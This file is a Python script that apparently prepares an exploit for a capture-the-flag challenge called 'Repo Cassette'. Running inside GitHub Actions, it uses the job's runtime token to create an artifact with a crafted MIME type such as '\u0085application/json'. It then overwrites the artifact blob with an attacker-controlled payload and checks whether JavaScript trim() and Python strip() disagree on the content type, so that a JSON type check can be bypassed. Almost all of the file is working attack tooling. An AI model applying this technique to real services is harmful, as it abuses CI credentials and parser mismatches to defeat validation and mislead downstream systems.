#!/usr/bin/env python3
"""Diagnostic publisher for the Repo Cassette artifact hypothesis.

GitHub's current backend accepts U+0085 MIME only for artifact versions below
7, whose REST download is always application/zip. This script therefore does
not yet create an artifact usable by the remote exploit.

Must run *inside* a GitHub Actions job: it needs ACTIONS_RESULTS_URL and
ACTIONS_RUNTIME_TOKEN, which only exist there.

Why an artifact: the challenge records sha256(GitHub's response body) and then
replays the live Content-Type verbatim, so the exploit needs one GitHub
response that is simultaneously
  * attacker-controlled in its bytes, and
  * typed so that Node's String.trim() keeps a leading U+0085 (-> not
    "application/json", so the repo-name and full_name checks are skipped)
    while Python's str.strip() removes it (-> the replay passes the postcard's
    "must be application/json" gate).

CreateArtifactRequest.mime_type is an arbitrary string, and the artifact
download reflects it, which gives exactly that response.

The payload has to name its own artifact id, so the artifact is finalized
first (FinalizeArtifact returns artifact_id) and the blob is then overwritten
with the self-referential body at the same fixed length.
"""

import base64
import hashlib
import json
import os
import sys
import urllib.error
import urllib.request

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import payload  # noqa: E402

# Candidate content types, in preference order. Python's str.strip() must reduce
# each to "application/json" while JS String.trim() must not, so that
# sourceFingerprint() takes the non-JSON branch but the postcard accepts the
# replay. 0x1c-0x1f are control bytes that llhttp may refuse on the wire; they
# are tried anyway in case the blob layer encodes them differently.
CANDIDATES = [
    ('u0085-prefix', '\u0085application/json'),
    ('u0085-suffix', 'application/json\u0085'),
    ('u0085-both', '\u0085application/json\u0085'),
    ('u001c-prefix', '\u001capplication/json'),
    ('u001f-prefix', '\u001fapplication/json'),
    ('plain-json', 'application/json'),  # control: proves the mime type is echoed at all
]
NAME = 'cassette.json'
MIME = CANDIDATES[0][1]
# ECMAScript String.prototype.trim(); Python's str.strip() additionally removes
# U+001C-U+001F and U+0085, which is the whole basis of the exploit.
JS_SPACE = ('\t\n\x0b\x0c\r \xa0\u1680\u2000\u2001\u2002\u2003\u2004\u2005'
            '\u2006\u2007\u2008\u2009\u200a\u2028\u2029\u202f\u205f\u3000\ufeff')
SERVICE = 'twirp/github.actions.results.api.v1.ArtifactService'


def backend_ids(token):
    """Pull the two backend ids out of the runtime token's Actions.Results scope."""
    claims = token.split('.')[1]
    claims += '=' * (-len(claims) % 4)
    scopes = json.loads(base64.urlsafe_b64decode(claims))['scp']
    for scope in scopes.split(' '):
        parts = scope.split(':')
        if parts[0] == 'Actions.Results':
            return parts[1], parts[2]
    raise SystemExit('no Actions.Results scope in ACTIONS_RUNTIME_TOKEN')


def twirp(base, token, method, body):
    request = urllib.request.Request(
        f'{base}{SERVICE}/{method}', data=json.dumps(body).encode(), method='POST',
        headers={'Content-Type': 'application/json',
                 'Authorization': f'Bearer {token}'})
    with urllib.request.urlopen(request, timeout=30) as response:
        return json.loads(response.read())


def put_blob(url, data, mime):
    request = urllib.request.Request(url, data=data, method='PUT', headers={
        'x-ms-blob-type': 'BlockBlob',
        'x-ms-blob-content-type': mime,
        'Content-Length': str(len(data)),
    })
    with urllib.request.urlopen(request, timeout=60) as response:
        return response.status


def main():
    results = os.environ['ACTIONS_RESULTS_URL']
    if not results.endswith('/'):
        results += '/'
    runtime = os.environ['ACTIONS_RUNTIME_TOKEN']
    slug = os.environ['GITHUB_REPOSITORY']
    owner, repo = slug.split('/')
    run_id, job_id = backend_ids(runtime)

    create = {'workflow_run_backend_id': run_id,
              'workflow_job_run_backend_id': job_id,
              'name': NAME, 'version': 6, 'mime_type': MIME}
    try:
        created = twirp(results, runtime, 'CreateArtifact', create)
    except urllib.error.HTTPError as error:
        raise SystemExit(f'CreateArtifact rejected version 6: {error.code} {error.read()[:300]!r}')
    if not created.get('ok'):
        raise SystemExit(f'CreateArtifact not ok: {created}')
    upload_url = created['signed_upload_url']
    print(f'[*] created artifact {NAME!r} with metadata mime_type {create["mime_type"]!r}')

    placeholder = b' ' * payload.SIZE
    print(f'[*] placeholder upload: HTTP {put_blob(upload_url, placeholder, MIME)}')

    final = twirp(results, runtime, 'FinalizeArtifact', {
        'workflow_run_backend_id': run_id, 'workflow_job_run_backend_id': job_id,
        'name': NAME, 'size': str(payload.SIZE)})
    if not final.get('ok'):
        raise SystemExit(f'FinalizeArtifact not ok: {final}')
    artifact_id = int(final['artifact_id'])
    print(f'[*] artifact_id = {artifact_id}')

    repository = payload.repository_for(owner, repo, artifact_id)
    body = payload.build(repository)
    print(f'[*] real upload: HTTP {put_blob(upload_url, body, MIME)}')
    print(f'[*] body sha256 = {hashlib.sha256(body).hexdigest()}')

    verify(slug, artifact_id, body)

    print('\n=== hand these to solve/pwn.py ===')
    print(f'repository = {repository}')
    print(f'body_b64   = {base64.b64encode(body).decode()}')


def verify(slug, artifact_id, body):
    """Read the artifact back through the REST endpoint the challenge will use."""
    token = os.environ.get('GH_API_TOKEN') or os.environ.get('GITHUB_TOKEN')
    url = f'https://api.github.com/repos/{slug}/actions/artifacts/{artifact_id}/zip'
    request = urllib.request.Request(url, headers={
        'Accept': 'application/vnd.github.v3+json',
        'User-Agent': 'https://github.com/sindresorhus/gh-got',
        **({'Authorization': f'token {token}'} if token else {}),
    })
    class NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, request, response, code, message, headers, url):
            return None

    try:
        urllib.request.build_opener(NoRedirect).open(request, timeout=30)
    except urllib.error.HTTPError as error:
        if error.code not in (301, 302, 303, 307, 308) or not error.headers.get('Location'):
            print(f'[-] verification fetch failed: {error.code} {error.read()[:200]!r}')
            return
        # GitHub redirects to an Azure SAS URL. Forwarding the GitHub Bearer
        # token makes Azure reject an otherwise valid signed download.
        redirect = urllib.request.Request(error.headers['Location'], headers={
            'User-Agent': 'https://github.com/sindresorhus/gh-got',
        })
        try:
            with urllib.request.urlopen(redirect, timeout=30) as response:
                served = response.read()
                content_type = response.headers.get('Content-Type', '')
        except urllib.error.HTTPError as download_error:
            print(f'[-] verification download failed: {download_error.code} '
                  f'{download_error.read()[:200]!r}')
            return
    else:
        print('[-] verification expected a GitHub redirect, received a direct response')
        return
    essence = content_type.split(',', 1)[0].split(';', 1)[0]
    node_sees = essence.strip(JS_SPACE).lower()
    python_sees = essence.strip().lower()
    print(f'[*] served Content-Type  = {content_type!r}')
    print(f'[*] Node    mediaType()  = {node_sees!r}')
    print(f'[*] Python  media_type   = {python_sees!r}')
    print(f'[*] bytes match payload  = {served == body}')
    if python_sees != 'application/json':
        print('[-] Python would reject the replay: the stored mime type was not honoured')
    elif node_sees == 'application/json':
        print('[-] Node would also call it JSON: the regex/full_name checks will apply')
    else:
        print('[+] content type has the Python/Node split the exploit needs')


if __name__ == '__main__':
    main()
